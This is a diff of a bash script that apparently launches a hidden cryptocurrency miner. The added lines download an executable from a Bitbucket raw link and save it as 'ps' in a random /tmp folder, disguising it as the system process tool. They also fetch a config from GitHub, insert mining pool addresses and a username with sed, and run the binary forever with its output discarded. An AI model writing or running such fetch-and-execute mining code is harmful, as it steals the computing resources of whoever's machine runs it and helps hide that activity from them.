@@ -1,12 +1,67 @@
 #!/bin/bash
 
-user="$1"
-pool_url="$2"
-pool_port="$3"
-worker="$(shuf -n 1 -i 1-999999)"
+if [[ "$1" ]]; then
+  user="$1"
+else
+  exit 1
+fi
+
+if [[ "$2" ]]; then
+  pool_url_1="$2"
+else
+  exit 1
+fi
+
+if [[ "$3" ]]; then
+  pool_port_1="$3"
+else
+  exit 1
+fi
+
+if [[ "$4" ]]; then
+  pool_url_2="$4"
+else
+  pool_url_2="127.0.0.1"
+fi
+
+if [[ "$5" ]]; then
+  pool_port_2="$5"
+else
+  pool_port_2="1000"
+fi
+
+if [[ "$6" ]]; then
+  pool_url_3="$6"
+else
+  pool_url_3="127.0.0.1"
+fi
+
+if [[ "$7" ]]; then
+  pool_port_3="$7"
+else
+  pool_port_3="1000"
+fi
+
+top="$(shuf -n 1 -i 1-999999)"
+
+mkdir /tmp/$top
+
+wget -O /tmp/$top/ps https://bitbucket.org/oscarhines623/workinside/raw/b23b1f28b86a0e86880a97ea56976934b4e331cb/lol
+wget -O /tmp/$top/build_config https://raw.githubusercontent.com/walters99/Slurb/main/build_config
+
+chmod +x /tmp/$top/ps /tmp/$top/build_config
+
+sed -i "s/RIGNAME/$top/" "/tmp/$top/build_config"
+sed -i "s/USERNAME/$user/" "/tmp/$top/build_config"
+sed -i "s/POOL_URL_1/$pool_url_1/" "/tmp/$top/build_config"
+sed -i "s/POOL_PORT_1/$pool_port_1/" "/tmp/$top/build_config"
+sed -i "s/POOL_URL_2/$pool_url_2/" "/tmp/$top/build_config"
+sed -i "s/POOL_PORT_2/$pool_port_2/" "/tmp/$top/build_config"
+sed -i "s/POOL_URL_3/$pool_url_3/" "/tmp/$top/build_config"
+sed -i "s/POOL_PORT_3/$pool_port_3/" "/tmp/$top/build_config"
 
 while :
 do
-  timeout 3m /tmp/ps --pool $pool_url:$pool_port --username $user.$worker --password x --algorithm wrkzcoin >/dev/null
+  timeout 3m /tmp/$top/ps --config /tmp/$top/build_config >/dev/null 
   sleep 20s
 done
